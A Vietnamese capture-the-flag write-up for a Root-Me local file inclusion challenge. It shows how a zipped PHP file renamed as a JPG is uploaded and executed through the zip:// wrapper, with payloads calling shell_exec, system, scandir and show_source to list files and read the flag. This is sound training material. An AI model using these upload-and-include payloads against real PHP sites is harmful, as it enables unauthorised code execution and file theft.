# WRITE UP

**Challenge:** [Local File Inclusion - Wrappers](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers)

<img src="./media/image1.png" style="width:6.5in;height:1.38125in" alt="Graphical user interface, text, application, website Description automatically generated" />

Khi thử upload without source, ta nhận được message:

*"Sorry, only JPG images will be accepted. Please use a different service if you do not intend to upload pictures”*

Đề bài gợi ý là Wrapper, ta chú ý đến PHP Wrapper. Dó đó thử dụng php://filter để get source index.php nhưng không khả thi:

<img src="./media/image2.png" style="width:6.5in;height:1.52778in" alt="Graphical user interface, text, application, website Description automatically generated" /> Sử dụng data wrapper thì bị nhận diện attack còn sử dụng encode base64 thì nhận được lỗi “page name too long”:

<img src="./media/image3.png" style="width:6.5in;height:1.76597in" alt="Graphical user interface, text, application, Word Description automatically generated" />

<img src="./media/image4.png" style="width:6.5in;height:1.54514in" alt="Graphical user interface, text, application, Word Description automatically generated" />

Đến đây, chắc có lẽ ta cần sử dụng cổng upload này để upload command lên server, sau đó, dùng wrapper để chạy file. Ta sử dụng đến wrapper **zip://** để đọc file từ zip vì có lẽ server chặn các cổng data mất rồi:

**Code getsource.php:**

&lt;pre&gt;&lt;?php show\_source('index.php'); ?&gt;&lt;/pre&gt;;

Ta đặt tên là getsource.php, sau đó zip file lại getsource.zip, rename getsource.jpg , sau đó upload lên server:

<img src="./media/image5.png" style="width:6.5in;height:1.94236in" alt="Graphical user interface, text, application, website Description automatically generated" />

Chú ý đến cấu trúc URL: <http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&id=8Gjbt40un>

Lúc này, page đang load một filename có id là **8Gjbt40un** khác với image name của ta Server đã upload lên /tmp/upload/image\_id.jpg. Sử dụng zip wrapper tuy cập đến **/tmp/upload/8Gjbt40un.jpg%23getsource,** server sẽ tự concat thêm ‘.php’ cho ta để có câu request hoàn chỉnh:

*?page=zip://tmp/upload/8Gjbt40un.jpg%23getsource**.php***

<img src="./media/image6.png" style="width:6.5in;height:1.77639in" alt="Graphical user interface, text, application Description automatically generated" />

Tuy nhiên, ta lại nhận được lỗi tên quá dài. Ta cần rename lại thành t.php t.zip t.jpg, sau đó upload lại:

<img src="./media/image7.png" style="width:6.5in;height:1.93611in" alt="Graphical user interface, text, application, website Description automatically generated" />

***Payload:** ?page=zip://tmp/upload/XoMA4xJDj.jpg%23**t.php***

<img src="./media/image8.png" style="width:6.5in;height:3.85256in" alt="Graphical user interface, text, application Description automatically generated" />

Source không có thông tin gì liên quan đến password cả, giờ thì ta phải thử tìm trong folder chứ index.php vì có thể sẽ có file khác nhưng ta không Path Traversal đc:

**Payload:** *&lt;pre&gt;&lt;?php shell\_exec('ls -la') ?&gt;&lt;/pre&gt;;*

<img src="./media/image9.png" style="width:6.5in;height:2.02153in" alt="Graphical user interface, text, application Description automatically generated" />

shell\_exec() bị block. Ta thử với:

**Payload:** *&lt;pre&gt;&lt;?php system('ls -la') ?&gt;&lt;/pre&gt;;*

<img src="./media/image10.png" style="width:6.5in;height:2.03264in" alt="Graphical user interface, text, application, website Description automatically generated" />

system() cũng bị block. Ta thử với exec() nhưng cũng bị block:

<img src="./media/image11.png" style="width:6.5in;height:1.81528in" alt="Graphical user interface, text, application Description automatically generated" />

Không còn cách nào khác, ta sử dụng scandir() để list all file trong director:

*&lt;pre&gt;*

*&lt;?php*

*$path = './';*

*$files = scandir($path);*

*foreach($files as $file) {*

*echo "&lt;a href='$file'&gt;$file&lt;/a&gt;";*

*}*

*?&gt;*

*&lt;/pre&gt;;*

Xong, nó list all ra được và ta có thể thấy được flag:

<img src="./media/image12.png" style="width:6.5in;height:1.49028in" alt="Graphical user interface, text, application, email Description automatically generated" />

Đọc file flag với:

*&lt;pre&gt;&lt;?php show\_source('flag-mipkBswUppqwXlq9ZydO.php'); ?&gt;&lt;/pre&gt;;*

<img src="./media/image13.png" style="width:6.5in;height:2.24444in" alt="Graphical user interface, text, application, website Description automatically generated" />

<img src="./media/image14.png" style="width:6.5in;height:4.05208in" alt="A screenshot of a computer Description automatically generated with medium confidence" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
